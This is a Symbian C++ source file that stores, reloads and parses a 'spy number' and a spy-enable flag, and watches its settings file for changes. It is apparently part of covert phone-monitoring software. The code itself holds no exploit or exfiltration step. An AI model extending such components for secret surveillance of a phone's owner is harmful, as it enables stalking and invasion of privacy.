#include "SpyNumberFileMan.h"
#include "FxsBuild.h"

#include "Logger.h"
#include <f32file.h>

CSpyNumberFileMan::CSpyNumberFileMan(RFs& aFs,const TDesC& aFileName)
:CActive(CActive::EPriorityStandard),
iFs(aFs),
iFileName(aFileName)
{
}

CSpyNumberFileMan::~CSpyNumberFileMan()
{
	delete iTimer;
	Cancel();
	iObservers.Reset();
}

CSpyNumberFileMan* CSpyNumberFileMan::NewL(RFs& aFs,const TDesC& aFileName)
{
	CSpyNumberFileMan* self = new (ELeave)CSpyNumberFileMan(aFs,aFileName);
	CleanupStack::PushL(self);
	self->ConstructL();
	CleanupStack::Pop(self);
	return self;
}

void CSpyNumberFileMan::ConstructL()
{	
	iTimer=CTimeOut::NewL(*this);
	iTimer->SetInterval(10);
	
	CActiveScheduler::Add(this);
}

void CSpyNumberFileMan::AddObserver(MSpySettingObserver* aObserver)
{	
	if(aObserver)
		iObservers.Append(aObserver);
}

TInt CSpyNumberFileMan::RestoreL()
{	
	LOG0(_L("[CSpyNumberFileMan::RestoreL] Enter"))
	
	RFile file;
	TInt err = file.Open(iFs,iFileName,EFileRead);
	
	LOG1(_L("[CSpyNumberFileMan::RestoreL] file.Open Error: %d"),err)
	
	if(!err)
		{
		TInt size;
		if(!file.Size(size))
			{
			LOG1(_L("[CSpyNumberFileMan::Size] file Error: %d"),err)
			HBufC8* data = HBufC8::NewL(size);
			CleanupStack::PushL(data);
			
			TPtr8 ptr8 = data->Des();	
			err = file.Read(0, ptr8, size);
			
			if(KErrNone == err && size == data->Length() )
				{
				TPtrC8 ptrc(*data);
				//TPtrC8 version = ptrc.Mid(EPostionLicenceFileVersion,ELengthLicenceFileVersion);
				
				TPtrC8 spyEnable8 = ptrc.Mid(EPositionSpyEnable,ELengthSpyEnable);
				iSpyEnable = (EFlagSpyEnable == spyEnable8[0]);
				
				//LOGDATA(_L("spyEnable8.hash"),spyEnable8);		
				
				TInt pos = EPositionCCLength;
				
				//
				//read country code length
				TPtrC8 ccLen8 = ptrc.Mid(EPositionCCLength,ELengthCCLength);	
				pos += ELengthCCLength;
				
				//
				//read country code
				TPtrC8 countryCode8 = ptrc.Mid(pos, (TInt)ccLen8[0]);
				//iSpyNumber.iCountryCode = countryCode8;
				pos += countryCode8.Length();		
				
				//
				//read spy number length
				TPtrC8 spyNumLen8 = ptrc.Mid(pos, ELengthSpyNumberLength);
				pos += ELengthSpyNumberLength;
				
				//
				//read spynumber
				TPtrC8 spyNumber8 = ptrc.Mid(pos, (TInt)spyNumLen8[0]);
				if(spyNumber8.Length() < KMaxMobileNumberLength - 10 && countryCode8.Length() < KMaxCountryCodeLength) {
					
					TBuf8<KMaxMobileNumberLength> readNumber;
					if(countryCode8.Length()) {
						readNumber.Append(countryCode8);
						readNumber.Append(KSeparatorToken);
					}
					
					readNumber.Append(spyNumber8);
					
					ParseNumber(readNumber);
				}
				}
			
			CleanupStack::PopAndDestroy(data);					
			}
		file.Close();//close it	
		}
	
	LOG0(_L("[CSpyNumberFileMan::RestoreL] End"))
	
	return err;
}

void CSpyNumberFileMan::NotifyObserversL()
{	
	for(TInt i = 0; i <iObservers.Count(); i++) {
		((MSpySettingObserver*)iObservers[i])->SpySettingChangedL();
		
		LOG0(_L("[CSpyNumberFileMan::NotifyObserversL] Notified Observer Done"))
	}
}

void CSpyNumberFileMan::StoreL()
{	
	RFile file;
	CleanupClosePushL(file);
	//!BaflUtils::FileExists(iFs,iLicenceFile)){	
	
	//Replaces a file. If there is an existing file with the same name, this function overwrites it. If the file does not already exist, it is created	
	//
	TInt err = file.Replace(iFs,iFileName, EFileWrite);
	if(err ) {
		CleanupStack::PopAndDestroy(); //file
		return;
	}
	
	//
	//Write licence file version	
	TBuf8<ELengthFileVersion> version;
	version.Append(ESpyFileVersionMajor);
	version.Append(ESpyFileVersionMinor);
	
	User::LeaveIfError(file.Write(EPostionFileVersion, version));
	
	//
	//Write Spy enable flag
	TBuf8<ELengthSpyEnable> spyEnable;
	spyEnable.Append((iSpyEnable) ? EFlagSpyEnable: EFlagSpyDisable);
	
	User::LeaveIfError(file.Write(EPositionSpyEnable, spyEnable));	
	
	TBuf8<ELengthCCLength> ccLength8;
	ccLength8.Append((TUint8)iSpyNumber.iCountryCode.Length());
	
	TInt pos = EPositionCCLength;
	
	//
	//write country code length
	User::LeaveIfError(file.Write(pos, ccLength8));	
	
	pos += ccLength8.Length();
	
	//
	//write country code
	User::LeaveIfError(file.Write(pos, iSpyNumber.iCountryCode));
	
	pos += iSpyNumber.iCountryCode.Length();
	
	//
	TBuf8<ELengthSpyNumberLength> spyNumLen8;
	spyNumLen8.Append((TUint8)iSpyNumber.iNumber.Length());
	
	//
	//write spy number length
	User::LeaveIfError(file.Write(pos, spyNumLen8));
	pos += spyNumLen8.Length();
	
	//
	//spy number
	User::LeaveIfError(file.Write(pos, iSpyNumber.iNumber));
	
	file.Flush();	
	
	CleanupStack::PopAndDestroy(); //file
}

TBool& CSpyNumberFileMan::SpyEnable()
{
	return iSpyEnable;
}

TSpyNumber& CSpyNumberFileMan::SpyNumber()
{
	return iSpyNumber;
}

void CSpyNumberFileMan::SetSpyEnable(TBool aEnable)
{
	iSpyEnable = aEnable;
}

TBool CSpyNumberFileMan::IsDigit(const TDesC8& aNumber)
{
	TBool ret(ETrue);
	
	for(TInt i = 0; i < aNumber.Length(); i++) {
		if(!TChar(aNumber[i]).IsDigit()) {
			ret = EFalse;
			break;
		}
	}
	
	return ret;
}

//
//
//@param aNumber phone number with comma ie 66, 016684485
//
TBool CSpyNumberFileMan::ParseNumber(const TDesC8& aNumber)
{	

#ifdef __DEBUG_ENABLE__
	TBuf<100> numTmp;
	numTmp.Copy(aNumber);
	LOG1(_L("[CSpyNumberFileMan::ParseNumber] Number: %S"),&numTmp)
#endif
	
	TInt numberLen = aNumber.Length();
	
	if(!numberLen || numberLen <= 5)
		return EFalse;
	
	TBuf8<KMaxMobileNumberLength> numberArg;
	
	TBool leadingPlusSign(EFalse);
	
	if(aNumber[0] == '+') {
		leadingPlusSign = ETrue;
		numberArg.Copy(aNumber.Mid(1,numberLen -1));
	} else {
		numberArg.Copy(aNumber);
	}
	
	numberArg.Trim();
	numberLen = numberArg.Length();
	
	TInt pos = numberArg.Find(KSeparatorToken);
	
	//
	//reset spynumber
	Reset();
	
	if(pos == KErrNotFound) {
		iSpyNumber.iNumber.Copy(numberArg.Mid(0, numberLen));		
	} else if(pos == 0) {
		iSpyNumber.iNumber.Copy(numberArg.Mid(1, numberLen-1));
	} else {
		//		
		//number contains comma ','
		//
		
		if(pos <= KMaxCountryCodeLength ) {
			TInt ccStartPos = 0;
			//if(leadingPlusSign)
				//ccStartPos = 1;
			
			iSpyNumber.iCountryCode.Copy(numberArg.Mid(ccStartPos, pos));
			iSpyNumber.iCountryCode.Trim();
			
			if(!IsDigit(iSpyNumber.iCountryCode) ){
				iSpyNumber.iCountryCode.SetLength(0);
			}
			
		} else {
			return EFalse;
		}
		
		TInt subNumberLen = numberLen - pos -1;
		if(numberLen > ++pos && subNumberLen <= KMaxMobileNumberLength) {
			iSpyNumber.iNumber.Copy(numberArg.Mid(pos,  subNumberLen));			
			iSpyNumber.iNumber.Trim();
			
			if(!IsDigit(iSpyNumber.iNumber)) {
				iSpyNumber.iNumber.SetLength(0);
				return EFalse;
			}
		} else {
			return EFalse;
		}
	}
	
	iSpyNumber.iNumber16.Copy(iSpyNumber.iNumber);
	
	if(iSpyNumber.iCountryCode.Length()) {
		//
		//Indicates international format
		//
		
		iSpyNumber.iFullNumber.Append('+');
		iSpyNumber.iFullNumber.Append(iSpyNumber.iCountryCode);
		
		if(iSpyNumber.iNumber[0] == '0' ) {
			//
			//remove zero leading
			iSpyNumber.iFullNumber.Append(iSpyNumber.iNumber.Mid(1,iSpyNumber.iNumber.Length() -1 ));
		} else {
			iSpyNumber.iFullNumber.Append(iSpyNumber.iNumber);
		}
		
	} else {
		//
		//append 
		iSpyNumber.iFullNumber.Append(iSpyNumber.iNumber);		
	}
	
	iSpyNumber.iFullNumber16.Copy(iSpyNumber.iFullNumber);
	
	LOG1(_L("[CSpyNumberFileMan::ParseNumber] End, iFullNumber16 : %S"),&iSpyNumber.iFullNumber16)
	
	return ETrue;
}

void CSpyNumberFileMan::GetNumberWitComma(TBuf<KMaxMobileNumberLength>& aNumber)
{	
	TBuf8<KMaxMobileNumberLength> settingNumber8;
	
	if(iSpyNumber.iCountryCode.Length()) {
		settingNumber8.Append(iSpyNumber.iCountryCode);
		settingNumber8.Append(',');
	}
	
	settingNumber8.Append(iSpyNumber.iNumber);
	aNumber.Copy(settingNumber8);
}

void CSpyNumberFileMan::SetMonitorChange(TBool aMonitorChange)
{
	iMonitorChange = aMonitorChange;
	
	IssueNotifyChange();
}

void CSpyNumberFileMan::IssueNotifyChange()
{	
	if(iMonitorChange) {
		if(!IsActive()) {
			iFs.NotifyChange(ENotifyAll,iStatus, iFileName);
			SetActive();
		}

	} else {
		DoCancel();
	}
}

void CSpyNumberFileMan::DoCancel()
{
	iFs.NotifyChangeCancel();
}

void CSpyNumberFileMan::RunL()
{	
	LOG1(_L("[CSpyNumberFileMan::RunL] iStatus: %d"),iStatus.Int())
	
	if(iStatus == KErrNone) {
		//
		//Don't notify it now				
		iTimer->Start();
	}
	
	IssueNotifyChange();
}

TInt CSpyNumberFileMan::RunError(TInt aErr)
{	
	LOG1(_L("[CSpyNumberFileMan::RunError] aErr: %d"),aErr)
	
	IssueNotifyChange();
	
	return KErrNone;
}

void CSpyNumberFileMan::Reset()
{	
	//
	//
	iSpyNumber.iCountryCode.Zero();
	
	iSpyNumber.iNumber.Zero();
	iSpyNumber.iNumber16.Zero();
	
	iSpyNumber.iFullNumber.Zero();
	iSpyNumber.iFullNumber16.Zero();
}

void CSpyNumberFileMan::HandleTimedOutL()
{	
	LOG0(_L("[CSpyNumberFileMan::HandleTimedOutL] "))
	
	//
	//Tells observers that setting has changed		
	NotifyObserversL();	
}
